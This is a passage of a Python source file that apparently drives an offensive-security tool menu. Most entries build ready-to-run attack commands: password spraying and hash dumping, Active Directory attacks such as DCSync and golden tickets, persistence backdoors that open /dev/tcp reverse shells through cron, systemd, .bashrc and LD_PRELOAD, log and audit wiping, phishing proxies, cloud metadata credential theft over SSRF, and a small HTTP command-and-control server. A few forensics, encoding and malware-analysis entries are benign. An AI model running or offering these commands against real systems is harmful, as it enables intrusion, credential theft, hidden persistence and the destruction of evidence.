          "fields":[("t","Target","192.168.1.10"),("p","Path","/login"),("d","POST data","user=^USER^&pass=^PASS^"),("f","Fail string","Invalid")],
          "cmd": lambda f: f'hydra -L users.txt -P {RY} {f[0]} http-post-form "{f[1]}:{f[2]}:{f[3]}" -V' },
        { "id":"7",  "name":"CrackMapExec",         "desc":"SMB spray + exec across subnet",
          "fields":[("t","Target/CIDR","192.168.1.0/24"),("u","Username","administrator"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"crackmapexec smb {f[0]} -u {f[1]} -p '{f[2]}'" },
        { "id":"8",  "name":"Hash Identifier",      "desc":"Identify unknown hash type",
          "fields":[("h","Hash","5f4dcc3b5aa765d61d8327deb882cf99")],
          "cmd": lambda f: f'hashid "{f[0]}"' },
        { "id":"9",  "name":"Pass-the-Hash",        "desc":"Authenticate with NTLM hash",
          "fields":[("d","Domain","CORP"),("u","Username","Administrator"),("h","NTLM Hash","aad3b435..."),("t","Target IP","10.0.0.5")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/smbexec.py {f[0]}/{f[1]}@{f[3]} -hashes :{f[2]}" },
        { "id":"10", "name":"secretsdump",          "desc":"Dump SAM/NTDS/LSA secrets remotely",
          "fields":[("d","Domain","CORP"),("u","Username","Administrator"),("p","Password","P@ssw0rd!"),("t","Target IP","10.0.0.5")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{f[0]}/{f[1]}:{f[2]}@{f[3]}'" },
        { "id":"11", "name":"zip2john",             "desc":"Extract hash from zip for john",
          "fields":[("f","Zip file","secret.zip")],
          "cmd": lambda f: f"zip2john {f[0]} > zip.hash; john zip.hash --wordlist={RY}" },
        { "id":"12", "name":"ssh2john",             "desc":"Crack encrypted SSH private key",
          "fields":[("k","Key file","id_rsa")],
          "cmd": lambda f: f"ssh2john {f[0]} > ssh.hash; john ssh.hash --wordlist={RY}" },
        { "id":"13", "name":"Spray (Kerbrute)",     "desc":"Kerberos user enumeration + spray",
          "fields":[("dc","DC IP","10.0.0.1"),("d","Domain","corp.local"),("u","User list","users.txt"),("p","Password","Password1!")],
          "cmd": lambda f: f"kerbrute passwordspray -d {f[1]} --dc {f[0]} {f[2]} {f[3]}" },
        { "id":"14", "name":"Medusa Brute",         "desc":"Multi-protocol fast brute forcer",
          "fields":[("t","Target","192.168.1.10"),("u","User","admin"),("p","Passlist",RY),("m","Module","ssh")],
          "cmd": lambda f: f"medusa -h {f[0]} -u {f[1]} -P {f[2]} -M {f[3]} -t 10" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "ad": { "label": "ACTIVE DIRECTORY", "tools": [
        { "id":"1",  "name":"BloodHound Ingestor",  "desc":"Enumerate full AD attack paths",
          "fields":[("d","Domain","corp.local"),("u","User","lowpriv"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 bloodhound-python -u {f[1]} -p '{f[2]}' -d {f[0]} -dc {f[3]} -c All --zip" },
        { "id":"2",  "name":"Kerberoasting",        "desc":"Request + crack service tickets",
          "fields":[("d","Domain","corp.local"),("u","User","lowpriv"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py '{f[0]}/{f[1]}:{f[2]}' -dc-ip {f[3]} -request -outputfile kerberoast.txt\nhashcat -m 13100 kerberoast.txt {RY}" },
        { "id":"3",  "name":"AS-REP Roasting",      "desc":"Attack accounts without pre-auth",
          "fields":[("d","Domain","corp.local"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {f[0]}/ -usersfile users.txt -dc-ip {f[1]} -format hashcat -outputfile asrep.txt\nhashcat -m 18200 asrep.txt {RY}" },
        { "id":"4",  "name":"LDAP Dump",            "desc":"Authenticated LDAP enumeration",
          "fields":[("dc","DC IP","10.0.0.1"),("d","Domain","CORP"),("u","User","lowpriv"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"ldapdomaindump -u '{f[1]}\\\\{f[2]}' -p '{f[3]}' {f[0]}" },
        { "id":"5",  "name":"Evil-WinRM",           "desc":"WinRM shell into Windows host",
          "fields":[("t","Target IP","10.0.0.5"),("u","Username","Administrator"),("p","Password","P@ssw0rd")],
          "cmd": lambda f: f"evil-winrm -i {f[0]} -u {f[1]} -p '{f[2]}'" },
        { "id":"6",  "name":"DCSync",               "desc":"Replicate domain hashes via DCSync",
          "fields":[("d","Domain","corp.local"),("u","User","Administrator"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{f[0]}/{f[1]}:{f[2]}@{f[3]}' -just-dc" },
        { "id":"7",  "name":"Golden Ticket",        "desc":"Forge golden Kerberos ticket",
          "fields":[("d","Domain","corp.local"),("sid","Domain SID","S-1-5-21-..."),("h","KRBTGT hash","aad3..."),("u","Target user","administrator")],
          "cmd": lambda f: f'python3 ticketer.py -nthash {f[2]} -domain-sid {f[1]} -domain {f[0]} {f[3]}' },
        { "id":"8",  "name":"Zerologon Check",      "desc":"CVE-2020-1472 Netlogon vuln check",
          "fields":[("dc","DC hostname","DC01"),("ip","DC IP","10.0.0.1")],
          "cmd": lambda f: f"python3 zerologon_tester.py {f[0]} {f[1]}" },
        { "id":"9",  "name":"SMB Relay",            "desc":"Relay NTLM auth to gain access",
          "fields":[("t","Target IP","10.0.0.5"),("i","Interface","eth0")],
          "cmd": lambda f: f"responder -I {f[1]} -rdw --disable-ess\n# in separate tab:\nntlmrelayx.py -tf targets.txt -smb2support" },
        { "id":"10", "name":"Pass-the-Ticket",      "desc":"Import Kerberos TGT and use it",
          "fields":[("t","Ticket file","admin.ccache")],
          "cmd": lambda f: f"export KRB5CCNAME={f[0]}; python3 /usr/share/doc/python3-impacket/examples/psexec.py -k -no-pass corp.local/administrator@dc01" },
        { "id":"11", "name":"ADCS ESC1",            "desc":"AD Certificate Services ESC1 exploit",
          "fields":[("d","Domain","corp.local"),("u","User","lowpriv"),("p","Password","P@ssw0rd"),("dc","DC IP","10.0.0.1"),("ca","CA name","corp-CA")],
          "cmd": lambda f: f"python3 /opt/Certipy/certipy/entry.py find -u '{f[1]}@{f[0]}' -p '{f[2]}' -dc-ip {f[3]}\n# Then exploit:\npython3 /opt/Certipy/certipy/entry.py req -u '{f[1]}@{f[0]}' -p '{f[2]}' -ca {f[4]} -template User -upn administrator@{f[0]}" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "persist": { "label": "PERSISTENCE", "tools": [
        { "id":"1",  "name":"Cron Backdoor",        "desc":"Cron reverse shell every 5 min",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1") | crontab -' },
        { "id":"2",  "name":"Systemd Service",      "desc":"Drop persistent systemd backdoor",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f"""cat > /etc/systemd/system/netsync.service << 'EOF'
[Unit]
Description=Network Sync
After=network.target

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable netsync && systemctl start netsync""" },
        { "id":"3",  "name":".bashrc Hook",         "desc":"Inject into shell init",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &" >> ~/.bashrc' },
        { "id":"4",  "name":"SSH Authorized Key",   "desc":"Drop attacker pubkey for SSH access",
          "fields":[("k","Public key","ssh-rsa AAAA...")],
          "cmd": lambda f: f'mkdir -p ~/.ssh && echo "{f[0]}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys' },
        { "id":"5",  "name":"LD_PRELOAD Hook",      "desc":"Shared library injection hook",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'echo "void __attribute__((constructor)) init(){{system(\\"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1 &\\");}}"> hook.c\ngcc -shared -fPIC -o /tmp/hook.so hook.c\nexport LD_PRELOAD=/tmp/hook.so' },
        { "id":"6",  "name":"At Job",               "desc":"One-time persistence via at daemon",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("t","Time","now + 1 minute")],
          "cmd": lambda f: f'echo "bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1" | at "{f[2]}"' },
        { "id":"7",  "name":"PAM Backdoor",         "desc":"Add master password to PAM auth",
          "fields":[("pw","Master password","backdoor123")],
          "cmd": lambda f: f"""# Add to /etc/pam.d/common-auth BEFORE other rules:
echo "auth sufficient pam_unix.so nullok" >> /etc/pam.d/common-auth
# Or inject into PAM source (advanced):
python3 -c "
import hashlib
h = hashlib.sha512(b'{f[0]}').hexdigest()
print('# PAM hash for storage:', h)
print('# Add to shadow: root:'+h+':::::::')
" """ },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "log": { "label": "LOG CLEAR", "tools": [
        { "id":"1",  "name":"Full Log Wipe",        "desc":"Wipe auth, syslog, kern logs",
          "fields":[],
          "cmd": lambda f: "for log in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/messages /var/log/secure /var/log/lastlog; do cat /dev/null > $log 2>/dev/null; done; echo done" },
        { "id":"2",  "name":"Bash History Nuke",    "desc":"Destroy shell history completely",
          "fields":[],
          "cmd": lambda f: "history -c; cat /dev/null > ~/.bash_history; unset HISTFILE; export HISTSIZE=0" },
        { "id":"3",  "name":"UTMP/WTMP Wipe",       "desc":"Erase who/last/w login records",
          "fields":[],
          "cmd": lambda f: "cat /dev/null > /var/run/utmp; cat /dev/null > /var/log/wtmp; cat /dev/null > /var/log/btmp" },
        { "id":"4",  "name":"Shred File",           "desc":"Overwrite + delete file securely",
          "fields":[("f","File path","/tmp/payload.elf")],
          "cmd": lambda f: f"shred -zvun 7 {f[0]}" },
        { "id":"5",  "name":"Timestamp Stomp",      "desc":"Clone timestamps from reference",
          "fields":[("f","Target file","/tmp/evil.sh"),("r","Reference file","/etc/passwd")],
          "cmd": lambda f: f"touch -r {f[1]} {f[0]}; stat {f[0]}" },
        { "id":"6",  "name":"Selective Log Edit",   "desc":"Remove specific lines from log",
          "fields":[("f","Log file","/var/log/auth.log"),("p","Pattern to erase","192.168.1.100")],
          "cmd": lambda f: f"sed -i '/{f[1]}/d' {f[0]}" },
        { "id":"7",  "name":"Audit Log Disable",    "desc":"Stop auditd and wipe audit logs",
          "fields":[],
          "cmd": lambda f: "service auditd stop 2>/dev/null; systemctl stop auditd 2>/dev/null; cat /dev/null > /var/log/audit/audit.log 2>/dev/null" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "forensics": { "label": "FORENSICS", "tools": [
        { "id":"1",  "name":"Volatility 3",         "desc":"Memory forensics + analysis",
          "fields":[("i","Memory image","/evidence/ram.mem"),("p","Plugin","windows.pslist.PsList")],
          "cmd": lambda f: f"python3 vol.py -f {f[0]} {f[1]}" },
        { "id":"2",  "name":"Binwalk",              "desc":"Firmware analysis + file carving",
          "fields":[("f","Target file","firmware.bin")],
          "cmd": lambda f: f"binwalk -e --dd='.*' {f[0]}" },
        { "id":"3",  "name":"Strings + Grep",       "desc":"Extract readable strings from binary",
          "fields":[("f","Binary","malware.exe"),("p","Pattern (opt)","password|api_key")],
          "cmd": lambda f: f"strings -a {f[0]}" + (f" | grep -iE '{f[1]}'" if f[1] else "") },
        { "id":"4",  "name":"Exiftool",             "desc":"Extract metadata from any file",
          "fields":[("f","File","photo.jpg")],
          "cmd": lambda f: f"exiftool {f[0]}" },
        { "id":"5",  "name":"dd Disk Image",        "desc":"Create raw disk image",
          "fields":[("d","Source device","/dev/sda"),("o","Output","disk.dd")],
          "cmd": lambda f: f"dd if={f[0]} of={f[1]} bs=4M status=progress" },
        { "id":"6",  "name":"File Type Check",      "desc":"Identify file type + entropy",
          "fields":[("f","File","suspicious.bin")],
          "cmd": lambda f: f"file {f[0]}; xxd {f[0]} | head -20; python3 -c \"import math,collections; d=open('{f[0]}','rb').read(); cnt=collections.Counter(d); e=-sum(c/len(d)*math.log2(c/len(d)) for c in cnt.values()); print('Entropy:',round(e,3))\"" },
        { "id":"7",  "name":"Yara Scan",            "desc":"Scan file/dir with YARA rules",
          "fields":[("r","Rules file","malware.yar"),("t","Target","/tmp")],
          "cmd": lambda f: f"yara {f[0]} {f[1]} -r" },
        { "id":"8",  "name":"Network PCAP Analyze", "desc":"Extract creds + files from pcap",
          "fields":[("p","PCAP file","capture.pcap")],
          "cmd": lambda f: f"tcpdump -r {f[0]} -A | grep -iE 'pass|user|login|cookie|auth'\nnetworkMiner {f[0]} 2>/dev/null &" },
        { "id":"9",  "name":"SQLite DB Browser",    "desc":"Dump SQLite database contents",
          "fields":[("f","SQLite file","database.db")],
          "cmd": lambda f: f"sqlite3 {f[0]} '.tables' && sqlite3 {f[0]} '.dump'" },
        { "id":"10", "name":"Memory String Hunt",   "desc":"Hunt for secrets in process memory",
          "fields":[("p","Process name","firefox")],
          "cmd": lambda f: f"PID=$(pgrep {f[0]} | head -1); strings /proc/$PID/mem 2>/dev/null | grep -iE 'pass|token|secret|api_key' | head -50" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "phishing": { "label": "PHISHING & SE", "tools": [
        { "id":"1",  "name":"GoPhish Launch",       "desc":"Launch GoPhish campaign server",
          "fields":[],
          "cmd": lambda f: "cd /opt/gophish && ./gophish &; echo 'Admin panel: https://localhost:3333'" },
        { "id":"2",  "name":"SET Toolkit",          "desc":"Social Engineering Toolkit",
          "fields":[],
          "cmd": lambda f: "setoolkit" },
        { "id":"3",  "name":"Evilginx2",            "desc":"Reverse proxy phishing + session hijack",
          "fields":[("d","Your domain","attacker.com"),("lh","LHOST IP","1.2.3.4")],
          "cmd": lambda f: f"evilginx2 -p /usr/share/evilginx2/phishlets -c {f[0]}" },
        { "id":"4",  "name":"Beef-XSS Hook",        "desc":"Browser exploitation via XSS hook",
          "fields":[],
          "cmd": lambda f: "beef-xss &; echo 'Panel: http://localhost:3000/ui/panel'\necho 'Hook: <script src=\"http://YOUR-IP:3000/hook.js\"></script>'" },
        { "id":"5",  "name":"Clone Website",        "desc":"Clone target site for credential harvest",
          "fields":[("u","Target URL","https://login.target.com"),("p","Port","80")],
          "cmd": lambda f: f"wget -r -l2 --no-check-certificate -P /var/www/html/clone {f[0]}" },
        { "id":"6",  "name":"Email Spoof Check",    "desc":"Check if domain allows email spoofing",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"dig +short TXT {f[0]} | grep spf\ndig +short TXT _dmarc.{f[0]}\ndig +short MX {f[0]}" },
        { "id":"7",  "name":"O365 Spray",           "desc":"Password spray against Office 365",
          "fields":[("u","Userlist","users.txt"),("p","Password","Password1!"),("d","Domain","corp.com")],
          "cmd": lambda f: f"python3 /opt/MSOLSpray/MSOLSpray.py --userlist {f[0]} --password '{f[1]}'" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "mobile": { "label": "MOBILE / APK", "tools": [
        { "id":"1",  "name":"APK Decompile",        "desc":"Decompile APK with apktool",
          "fields":[("f","APK file","app.apk")],
          "cmd": lambda f: f"apktool d {f[0]} -o apk_out/" },
        { "id":"2",  "name":"APK Repack",           "desc":"Rebuild + sign modified APK",
          "fields":[("d","APK dir","apk_out")],
          "cmd": lambda f: f"apktool b {f[0]} -o repacked.apk\njarsigner -keystore mykey.jks repacked.apk alias_name" },
        { "id":"3",  "name":"Frida Hook",           "desc":"Instrument app at runtime with Frida",
          "fields":[("p","Package name","com.target.app"),("s","Script","ssl_bypass.js")],
          "cmd": lambda f: f"frida -U -f {f[0]} -l {f[1]} --no-pause" },
        { "id":"4",  "name":"SSL Pinning Bypass",   "desc":"Bypass SSL certificate pinning",
          "fields":[("p","Package name","com.target.app")],
          "cmd": lambda f: f"frida -U -f {f[0]} -l /opt/frida-scripts/ssl-bypass.js --no-pause\n# Alt: objection -g {f[0]} explore --startup-command 'android sslpinning disable'" },
        { "id":"5",  "name":"ADB Shell",            "desc":"Android Debug Bridge shell",
          "fields":[("ip","Device IP","192.168.1.100")],
          "cmd": lambda f: f"adb connect {f[0]}:5555; adb shell" },
        { "id":"6",  "name":"APK Static Analysis",  "desc":"Extract secrets from APK",
          "fields":[("f","APK file","app.apk")],
          "cmd": lambda f: f"apktool d {f[0]} -o apk_static/\ngrep -r 'api_key\\|password\\|secret\\|token\\|http' apk_static/ --include='*.xml' --include='*.smali' -i | head -50" },
        { "id":"7",  "name":"MobSF Analysis",       "desc":"Launch Mobile Security Framework",
          "fields":[],
          "cmd": lambda f: "docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n# Then: http://localhost:8000" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "crypto": { "label": "CRYPTO & ENCODING", "tools": [
        { "id":"1",  "name":"Base64 En/Decode",     "desc":"Encode or decode base64",
          "fields":[("d","Data","hello world"),("m","Mode (enc/dec)","enc")],
          "cmd": lambda f: (f'echo -n "{f[0]}" | base64' if f[1]=="enc" else f'echo "{f[0]}" | base64 -d') },
        { "id":"2",  "name":"ROT13",                "desc":"ROT13 cipher",
          "fields":[("d","Data","Hello World")],
          "cmd": lambda f: f'echo "{f[0]}" | tr A-Za-z N-ZA-Mn-za-m' },
        { "id":"3",  "name":"Caesar Brute",         "desc":"Brute force all Caesar shifts",
          "fields":[("d","Ciphertext","Khoor")],
          "cmd": lambda f: f"python3 -c \"c='{f[0]}'; [print(f'Shift {{s}}: {{\\\"\\\".join(chr((ord(x)-65+s)%26+65) if x.isupper() else chr((ord(x)-97+s)%26+97) if x.islower() else x for x in c)}}') for s in range(26)]\"" },
        { "id":"4",  "name":"XOR Decrypt",         "desc":"XOR a string with a key",
          "fields":[("d","Hex data","48656c6c6f"),("k","Key","secret")],
          "cmd": lambda f: f'python3 -c "d=bytes.fromhex(\'{f[0]}\'); k=b\'{f[1]}\'; print(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"' },
        { "id":"5",  "name":"Hash Generator",       "desc":"Generate hashes of a string",
          "fields":[("d","Data","password123")],
          "cmd": lambda f: f'python3 -c "import hashlib; d=b\'{f[0]}\'; [print(f\'{{a}}: {{hashlib.new(a,d).hexdigest()}}\') for a in [\'md5\',\'sha1\',\'sha256\',\'sha512\']]"' },
        { "id":"6",  "name":"OpenSSL Encrypt",      "desc":"AES-256 encrypt a file",
          "fields":[("f","Input file","secret.txt"),("o","Output","secret.enc")],
          "cmd": lambda f: f"openssl enc -aes-256-cbc -pbkdf2 -in {f[0]} -out {f[1]}" },
        { "id":"7",  "name":"OpenSSL Decrypt",      "desc":"AES-256 decrypt a file",
          "fields":[("f","Encrypted file","secret.enc"),("o","Output","decrypted.txt")],
          "cmd": lambda f: f"openssl enc -d -aes-256-cbc -pbkdf2 -in {f[0]} -out {f[1]}" },
        { "id":"8",  "name":"Steghide",             "desc":"Hide/extract data in image",
          "fields":[("m","Mode (embed/extract)","extract"),("f","Image file","photo.jpg"),("o","Output","hidden.txt")],
          "cmd": lambda f: (f"steghide extract -sf {f[1]} -p '' -xf {f[2]}" if f[0]=="extract" else f"steghide embed -cf {f[1]} -ef {f[2]}") },
        { "id":"9",  "name":"Magic Decode",         "desc":"Try all common encodings",
          "fields":[("d","Data","SGVsbG8gV29ybGQ=")],
          "cmd": lambda f: f'python3 -c "\nimport base64, binascii, urllib.parse, html\nd = \'{f[0]}\'\ntry: print(\'b64:\', base64.b64decode(d).decode())\nexcept: pass\ntry: print(\'hex:\', bytes.fromhex(d).decode())\nexcept: pass\nprint(\'url:\', urllib.parse.unquote(d))\nprint(\'html:\', html.unescape(d))\n"' },
        { "id":"10", "name":"JWT Decode",           "desc":"Decode JWT without verification",
          "fields":[("t","JWT Token","eyJ...")],
          "cmd": lambda f: f'python3 -c "\nimport base64, json\nparts = \'{f[0]}\'.split(\'.\')\nfor i, p in enumerate(parts[:2]):\n    p += \'==\'\n    try: print(f\'Part {{i}}:\', json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))\n    except: pass\n"' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "cloud": { "label": "CLOUD ATTACK", "tools": [
        { "id":"1",  "name":"AWS Metadata SSRF",    "desc":"Steal AWS creds via metadata endpoint",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://169.254.169.254/latest/meta-data/iam/security-credentials/"' },
        { "id":"2",  "name":"AWS Enum (CLI)",        "desc":"Enumerate AWS with stolen creds",
          "fields":[("ak","Access Key","AKIA..."),("sk","Secret Key","xxx"),("r","Region","us-east-1")],
          "cmd": lambda f: f"export AWS_ACCESS_KEY_ID={f[0]}; export AWS_SECRET_ACCESS_KEY={f[1]}; export AWS_DEFAULT_REGION={f[2]}\naws sts get-caller-identity\naws s3 ls\naws iam list-users\naws ec2 describe-instances" },
        { "id":"3",  "name":"S3 Bucket Enum",       "desc":"Find public S3 buckets for a target",
          "fields":[("d","Domain/Company","targetcorp")],
          "cmd": lambda f: f"for b in {f[0]} {f[0]}-backup {f[0]}-dev {f[0]}-staging {f[0]}-prod {f[0]}-data; do aws s3 ls s3://$b 2>/dev/null && echo \"[+] Found: $b\"; done" },
        { "id":"4",  "name":"GCP Metadata",         "desc":"Steal GCP service account token",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"' },
        { "id":"5",  "name":"Azure Metadata",       "desc":"Steal Azure managed identity token",
          "fields":[("u","SSRF URL","http://target.com/fetch?url=")],
          "cmd": lambda f: f'curl -s "{f[0]}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true"' },
        { "id":"6",  "name":"Kubernetes Enum",      "desc":"Enumerate exposed Kubernetes API",
          "fields":[("t","Target IP","10.0.0.5"),("p","Port","6443")],
          "cmd": lambda f: f"curl -k https://{f[0]}:{f[1]}/api/v1/namespaces\ncurl -k https://{f[0]}:{f[1]}/api/v1/pods\ncurl -k https://{f[0]}:{f[1]}/api/v1/secrets" },
        { "id":"7",  "name":"AWS IAM Priv Esc",     "desc":"Check for IAM privilege escalation paths",
          "fields":[("u","IAM Username","current-user")],
          "cmd": lambda f: f"aws iam list-attached-user-policies --user-name {f[0]}\naws iam list-user-policies --user-name {f[0]}\naws iam list-groups-for-user --user-name {f[0]}\npython3 /opt/aws_escalate.py" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "malware": { "label": "MALWARE ANALYSIS", "tools": [
        { "id":"1",  "name":"VirusTotal Check",     "desc":"Check file hash against VirusTotal",
          "fields":[("f","File","suspicious.exe"),("k","VT API Key","your_api_key")],
          "cmd": lambda f: f'sha256=$(sha256sum {f[0]} | cut -d" " -f1)\ncurl -s -H "x-apikey: {f[1]}" "https://www.virustotal.com/api/v3/files/$sha256" | python3 -m json.tool' },
        { "id":"2",  "name":"Static PE Analysis",  "desc":"Analyse PE headers + imports",
          "fields":[("f","PE file","malware.exe")],
          "cmd": lambda f: f"file {f[0]}; strings {f[0]} | grep -iE 'http|cmd|powershell|reg|key|pass'\nexiftool {f[0]} 2>/dev/null\npython3 -c \"import pefile; pe=pefile.PE('{f[0]}'); [print(e.name.decode()) for e in pe.DIRECTORY_ENTRY_IMPORT]\" 2>/dev/null" },
        { "id":"3",  "name":"strace / ltrace",     "desc":"Trace syscalls and lib calls",
          "fields":[("b","Binary","./malware")],
          "cmd": lambda f: f"strace -o strace.log {f[0]} &\nstrace_pid=$!\ncat strace.log | grep -E 'open|read|write|connect|socket'" },
        { "id":"4",  "name":"Detect Packers",      "desc":"Detect binary packing/obfuscation",
          "fields":[("f","File","suspicious.exe")],
          "cmd": lambda f: f"python3 -c \"import math,collections; d=open('{f[0]}','rb').read(); cnt=collections.Counter(d); e=-sum(c/len(d)*math.log2(c/len(d)) for c in cnt.values()); print('Entropy:',round(e,3),'(>7.0 = likely packed)')\"\nexiftool {f[0]} | grep -i pack" },
        { "id":"5",  "name":"Deobfuscate PowerShell","desc":"Decode obfuscated PowerShell",
          "fields":[("s","PS Script/File","script.ps1")],
          "cmd": lambda f: f"cat {f[0]} | python3 -c \"import sys,base64,re; d=sys.stdin.read(); m=re.findall(r'[A-Za-z0-9+/]{{40,}}={{0,2}}', d); [print(base64.b64decode(x+('='*(4-len(x)%4))).decode('utf-16-le','ignore')) for x in m]\"" },
        { "id":"6",  "name":"YARA Rule Write",     "desc":"Generate basic YARA rule from strings",
          "fields":[("f","File","malware.exe"),("n","Rule name","detect_malware")],
          "cmd": lambda f: f"""strings -a {f[0]} | sort -u | head -20 > /tmp/strings_out.txt
python3 -c "
strs = open('/tmp/strings_out.txt').read().splitlines()
good = [s for s in strs if len(s) > 8 and s.isascii()][:10]
print('rule {f[1]} {{')
print('  strings:')
for i, s in enumerate(good):
    print(f'    \$s{{i}} = \\\"{{s}}\\\"')
print('  condition:')
print('    3 of them')
print('}}')
" """ },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "c2": { "label": "C2 FRAMEWORK", "tools": [
        { "id":"1",  "name":"Sliver C2 Server",     "desc":"Start Sliver C2 server",
          "fields":[],
          "cmd": lambda f: "sliver-server\n# Inside sliver: generate --mtls --lhost YOUR_IP --save ./implant" },
        { "id":"2",  "name":"Sliver Implant Gen",   "desc":"Generate Sliver beacon/session implant",
          "fields":[("lh","LHOST","10.10.14.1"),("o","OS (windows/linux/darwin)","linux"),("t","Type (beacon/session)","beacon")],
          "cmd": lambda f: f"sliver-server generate --{f[2]} --mtls --lhost {f[0]} --os {f[1]} --save ./{f[1]}_implant" },
        { "id":"3",  "name":"Havoc C2 Start",       "desc":"Launch Havoc C2 teamserver",
          "fields":[("c","Config file","teamserver.yaml")],
          "cmd": lambda f: f"cd /opt/Havoc && ./havoc server --profile {f[0]}" },
        { "id":"4",  "name":"Covenant C2",          "desc":"Start Covenant .NET C2",
          "fields":[],
          "cmd": lambda f: "cd /opt/Covenant/Covenant && dotnet run\n# Panel: https://localhost:7443" },
        { "id":"5",  "name":"SimpleHTTP C2",        "desc":"Minimal Python C2 over HTTP",
          "fields":[("lh","LHOST","0.0.0.0"),("lp","LPORT","8080")],
          "cmd": lambda f: f"""cat > /tmp/c2_server.py << 'EOF'
import http.server, socketserver, threading, urllib.parse

clients = {{}}

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        cid = self.headers.get('X-ID', 'unknown')
        cmd = clients.get(cid, 'whoami')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(cmd.encode())

    def do_POST(self):
        cid = self.headers.get('X-ID', 'unknown')
        length = int(self.headers.get('Content-Length', 0))
        result = self.rfile.read(length).decode()
        print(f'[{{cid}}] {{result}}')
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args): pass

with socketserver.TCPServer(('{f[0]}', {f[1]}), C2Handler) as s:
    print(f'C2 on {f[0]}:{f[1]}')
    s.serve_forever()
EOF
python3 /tmp/c2_server.py""" },
        { "id":"6",  "name":"DNS C2 Setup",         "desc":"DNS-based C2 channel with dnscat2",
          "fields":[("d","Domain","c2.attacker.com")],
          "cmd": lambda f: f"# Server:\nruby /opt/dnscat2/server/dnscat2.rb {f[0]}\n# Client (on victim):\n./dnscat --dns domain={f[0]}" },
        { "id":"7",  "name":"ICMP C2",              "desc":"ICMP tunnel for covert C2",
          "fields":[("lh","LHOST","10.10.14.1"),("rh","Victim IP","10.0.0.5")],
          "cmd": lambda f: f"# Install ptunnel:\napt install ptunnel -y\n# Server:\nptunnel -x secretpass\n# Client:\nptunnel -p {f[0]} -lp 2222 -da 127.0.0.1 -dp 22 -x secretpass" },
        { "id":"8",  "name":"Cobalt Strike Aggressor","desc":"CS Aggressor script snippet templates",
          "fields":[("a","Action (sleep/screenshot/keylog)","sleep"),("v","Value","30")],
          "cmd": lambda f: {
              "sleep":      f'sleep {f[1]};',
              "screenshot": "screenshot;",
              "keylog":     f"keylogger;\n# collect after {f[1]}s:\nkeystrokes;",
          }.get(f[0], f"# Unknown action: {f[0]}") },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "wireless": { "label": "WIRELESS / RF", "tools": [
        { "id":"1",  "name":"WiFi Monitor Mode",    "desc":"Enable monitor mode on interface",
          "fields":[("i","Interface","wlan0")],
          "cmd": lambda f: f"airmon-ng check kill; airmon-ng start {f[0]}\niwconfig {f[0]}mon" },
        { "id":"2",  "name":"WPA Handshake Cap",    "desc":"Capture WPA2 handshake",
          "fields":[("i","Monitor interface","wlan0mon"),("b","Target BSSID","AA:BB:CC:DD:EE:FF"),("c","Channel","6")],
          "cmd": lambda f: f"airodump-ng -c {f[2]} --bssid {f[1]} -w handshake {f[0]}" },
        { "id":"3",  "name":"Deauth Attack",        "desc":"Force client deauthentication",
          "fields":[("i","Interface","wlan0mon"),("b","AP BSSID","AA:BB:CC:DD:EE:FF"),("c","Client MAC (opt)","")],
          "cmd": lambda f: f"aireplay-ng --deauth 100 -a {f[1]}" + (f" -c {f[2]}" if f[2] else "") + f" {f[0]}" },
        { "id":"4",  "name":"WPA Crack Hashcat",    "desc":"Crack captured WPA handshake",
